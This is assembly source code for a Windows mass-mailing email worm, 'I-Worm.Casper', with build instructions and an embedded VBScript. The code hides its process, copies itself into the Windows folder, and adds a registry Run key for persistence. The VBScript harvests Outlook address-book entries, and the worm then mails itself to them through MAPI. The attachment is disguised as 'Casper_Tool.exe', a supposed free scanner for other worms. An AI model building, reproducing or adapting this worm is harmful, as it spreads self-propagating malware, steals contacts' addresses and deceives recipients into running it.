;--- dllz.def
IMPORTS

	WININET.InternetGetConnectedState
	SHLWAPI.SHSetValueA
;---


comment #
Name : I-Worm.Casper
Author : PetiK
Date : August 17th - August 24th
Size :  6144 byte (compressed with UPX tool)

Action : Copy itself to
		* WINDOWS\MsWinsock32.exe
	 Add in the key HKLM\Software\Microsoft\Windows\CurrentVersion\Run the value
		* Winsock32 1.0 = WINDOWS\MsWinsock32.exe


To build the worm:
tasm32 /ml /m9 Casper
tlink32 -Tpe -c -x -aa Casper,,,import32,dllz
upx -9 Casper.exe

To delete the worm:
del %windir%\MsWinsock32.exe
del %windir%\CasperEMail.txt

dllz.def file:
IMPORTS

	WININET.InternetGetConnectedState
	SHLWAPI.SHSetValueA


#

.586p
.model flat
.code

JUMPS

callx macro a
extrn a:proc
call a
endm

include useful.inc

DEBUT:
Main_Worm:

	call  Hide_Worm
	call  Copy_Worm
	call  Check_Wsock
	call  Prepare_Spread_Worm

	Connected_:
	push  00h
	push  offset Tmp
	callx InternetGetConnectedState
	dec   eax
	jnz   Connected_

	mov   edi,offset casper_mail
	push  edi
	push  50
	push  edi
	callx GetWindowsDirectoryA
	add   edi,eax
	mov   eax,"saC\"
	stosd
	mov   eax,"Erep"
	stosd
	mov   eax,"liaM"
	stosd
	mov   eax,"txt."
	stosd	
	xor   eax,eax
	stosd

	call  Spread_Worm

Hide_Worm proc
	pushad
	@pushsz "Kernel32.dll"
	callx GetModuleHandleA
	xchg  eax,ecx
	jecxz End_Hide
	@pushsz "RegisterServiceProcess"
	push  ecx
	callx GetProcAddress
	xchg  eax,ecx
	jecxz End_Hide
	push  1
	push  0
	call  ecx
	End_Hide:
	popad
	ret
Hide_Worm endp

Check_Wsock proc
	Search_Wsock:
	push  50
	mov   edi,offset wsock_file
	push  edi
	callx GetSystemDirectoryA
	add   edi,eax
	mov   eax,"osW\"
	stosd
	mov   eax,"23kc"
	stosd
	mov   eax,"lld."
	stosd
	xor   eax,eax
	stosd

	push  offset wsock_file
	callx GetFileAttributesA
	cmp   eax,20h
	jne   End_Wsock

	xor   eax,eax
	push  eax
	push  eax
	push  03h
	push  eax
	push  eax
	push  80000000h or 40000000h
	push  offset wsock_file
	callx CreateFileA
	mov   wsckhdl,eax

	File_Mapping:
	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  04h
	push  eax
	push  wsckhdl
	callx CreateFileMappingA
	test  eax,eax
	jz    Close_File
	mov   wsckmap,eax

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  06h
	push  wsckmap
	callx MapViewOfFile
	test  eax,eax
	jz    Close_Map_File
	mov   esi,eax
	mov   wsckview,eax

	Old_Infect:
	mov   verif,0
	cmp   word ptr [esi],"ZM"
	jne   UnmapView_File
	cmp   byte ptr [esi+12h],"z"
	je    Infected_By_Happy
	cmp   word ptr [esi+38h],"ll"
	je    Infected_By_Icecubes
	jmp   UnmapView_File
	
	Infected_By_Happy:
	push  10h
	push  offset warning
	@pushsz "I-Worm.Happy coded by Spanska"
	push  00h
	callx MessageBoxA
	inc   verif
	jmp   UnmapViewOfFile
	Infected_By_Icecubes:
	push  10h
	push  offset warning
	@pushsz "I-Worm.Icecubes coded by f0re"
	push  00h
	callx MessageBoxA
	inc   verif
	jmp   UnmapViewOfFile
	Already_Infected:
	inc   verif
	jmp   UnmapViewOfFile

	UnmapView_File:
	push  wsckview
	callx UnmapViewOfFile
	Close_Map_File:
	push  offset wsckmap
	callx CloseHandle
	Close_File:
	push  wsckhdl
	callx CloseHandle
	End_Wsock:
	ret
Check_Wsock endp

Copy_Worm proc
	pushad
	Original_Name:
	push  50
	mov   esi,offset original
	push  esi
	push  0
	callx GetModuleFileNameA

	Copy_Name:
	mov   edi,offset copy_name
	push  edi
	push  50
	push  edi
	callx GetWindowsDirectoryA
	add   edi,eax
	mov   eax,'WsM\'
	stosd
	mov   eax,'osni'
	stosd
	mov   eax,'23kc'
	stosd
	mov   eax,'exe.'
	stosd
	pop   edi
	push  0
	push  edi
	push  esi
	callx CopyFileA

	Reg_Registered:
	push  08h
	push  edi
	push  01h
	@pushsz "Winsock32"
	@pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
	push  80000002h
	callx SHSetValueA
	push  08h
	@pushsz "PetiK - France - (c)2001"
	push  01h
	@pushsz "Author"
	@pushsz "Software\CasperWorm"
	push  80000001h
	callx SHSetValueA
	push  08h
	@pushsz "1.00"
	push  01h
	@pushsz "Version"
	@pushsz "Software\CasperWorm"
	push  80000001h
	callx SHSetValueA
	popad
	ret
Copy_Worm endp


Prepare_Spread_Worm proc
	pushad
	push  00h
	push  80h
	push  02h
	push  00h
	push  01h
	push  40000000h
	@pushsz "C:\CasperMail.vbs"
	callx CreateFileA
	xchg  edi,eax
	push  00h
	push  offset octets
	push  VBSSIZE
	push  offset vbsd
	push  edi
	callx WriteFile
	push  edi
	callx CloseHandle
	push  1
	@pushsz "wscript C:\CasperMail.vbs"
	callx WinExec
	push  3 * 1000
	callx Sleep
	@pushsz "C:\CasperMail.vbs"
	callx DeleteFileA
	popad
	ret
Prepare_Spread_Worm endp

	Spread_Worm:
	pushad
	push  00h
	push  80h
	push  03h
	push  00h
	push  01h
	push  80000000h
	push  offset casper_mail
	callx CreateFileA
	inc   eax
	test  eax,eax
	je    End_Spread_worm
	dec   eax
	xchg  eax,ebx

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  02h
	push  eax
	push  ebx
	callx CreateFileMappingA
	test  eax,eax
	je    F1
	xchg  eax,ebp

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  04h
	push  ebp
	callx MapViewOfFile
	test  eax,eax
	je    F2
	xchg  eax,esi

	push  00h
	push  ebx
	callx GetFileSize
	cmp   eax,03h
	jbe   F3

	call  Scan_Mail

	F3:	push  esi
	callx UnmapViewOfFile
	F2:	push  ebp
	callx CloseHandle
	F1:	push  ebx
	callx CloseHandle
	End_Spread_worm:
	popad
	ret

	Scan_Mail:
	pushad
	xor   edx,edx
	mov   edi,offset m_addr
	push  edi
	p_c:  lodsb
	cmp   al," "
	je    car_s
	cmp   al,0dh
	je    entr1
	cmp   al,0ah
	je    entr2
	cmp   al,"#"
	je    f_mail
	cmp   al,"@"
	je    not_a
	inc   edx
	not_a:	stosb
		jmp  p_c
	car_s:	inc  esi
		jmp  p_c
	entr1:	xor  al,al
		stosb
		pop  edi
		test edx,edx
		je   Scan_Mail	
		call Send_Mail
		jmp  Scan_Mail
	entr2:	xor  al,al
		stosb
		pop  edi
		jmp  Scan_Mail
	f_mail:
	FIN:	push  00h
	callx ExitProcess

	Send_Mail:	
	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  offset Message
	push  [MAPIHdl]
	callx MAPISendMail
	ret


.data
; ===== Main_Worm =====
wsock_file	db 50 dup (0)

; ===== Check_Wsock =====
wsckhdl		dd 0
wsckmap		dd 0
wsckview	dd 0
PEHeader	dd 0
warning		db "Warning : You're infected by",00h
verif		dd ?

; ===== Copy_Worm =====
original	db 50 dup (0)
copy_name	db 50 dup (0)

; ===== Prepare_Spread_Worm =====
octets		dd ?

; ===== Spread_Worm =====
m_addr		db 128 dup (?)
casper_mail	db 50 dup (0)
mail_name	db "Casper_Tool.exe",00h
MAPIHdl		dd 0
Tmp		dd 0

subject		db "Casper Tool Protect 1.00",00h
body		db "Hi,",0dh,0ah
		db "Look at this attachment...",0dh,0ah
		db "This freeware alert you if you infected by "
		db "I-Worm.Happy and I-Worm.Icecubes.",0dh,0ah
		db "These worms spread with the file WSOCK32.DLL in the SYSTEM path.",0dh,0ah
		db "The tool Casper v.1.00 scans this specific file and displays a message "
		db "if it infected.",0dh,0ah,0dh,0ah,0dh,0ah
		db 09h,09h,09h,"Good Bye and have a nice day",00h

Message		dd ?
		dd offset subject
		dd offset body
		dd ?
		dd ?
		dd ?
		dd 2
		dd offset MsgFrom
		dd 1
		dd offset MsgTo
		dd 1
		dd offset Attach

MsgFrom		dd ?
		dd ?
		dd ?
		dd ?
		dd ?
		dd ?

MsgTo		dd ?
		dd 1
		dd offset m_addr
		dd offset m_addr
		dd ?
		dd ?

Attach		dd ?
		dd ?
		dd ?
		dd offset original
		dd offset mail_name
		dd ?

vbsd:
db 'On Error Resume Next',0dh,0ah
db 'Set Casper = CreateObject("Outlook.Application")',0dh,0ah
db 'Set L = Casper.GetNameSpace("MAPI")',0dh,0ah
db 'Set fs=CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'Set c=fs.CreateTextFile(fs.GetSpecialFolder(0)&"\CasperEMail.txt")',0dh,0ah
db 'c.Close',0dh,0ah
db 'For Each M In L.AddressLists',0dh,0ah
db 'If M.AddressEntries.Count <> 0 Then',0dh,0ah
db 'For O = 1 To M.AddressEntries.Count',0dh,0ah
db 'Set P = M.AddressEntries(O)',0dh,0ah
db 'Set c=fs.OpenTextFile(fs.GetSpecialFolder(0)&"\CasperEMail.txt",8,true)',0dh,0ah
db 'c.WriteLine P.Address',0dh,0ah
db 'c.Close',0dh,0ah
db 'Next',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
db 'Set c=fs.OpenTextFile(fs.GetSpecialFolder(0)&"\CasperEMail.txt",8,true)',0dh,0ah
db 'c.WriteLine "#"',0dh,0ah
db 'c.Close',0dh,0ah
VBSSIZE	= $-vbsd

MAX_PATH		equ 260
FILETIME		struct
dwLowDateTime		dd ?
dwHighDateTime		dd ?
FILETIME		ends
WIN32_FIND_DATA 	struct
dwFileAttributes	dd ?
ftCreationTime		FILETIME ?
ftLastAccessTime	FILETIME ?
ftLastWriteTime		FILETIME ?
nFileSizeHigh		dd ?
nFileSizeLow		dd ?
dwReserved0		dd ?
dwReserved1		dd ?
cFileName		dd MAX_PATH (?)
cAlternateFileName	db 13 dup (?)
			db 3 dup (?)
WIN32_FIND_DATA		ends

Search		WIN32_FIND_DATA <>

end DEBUT
end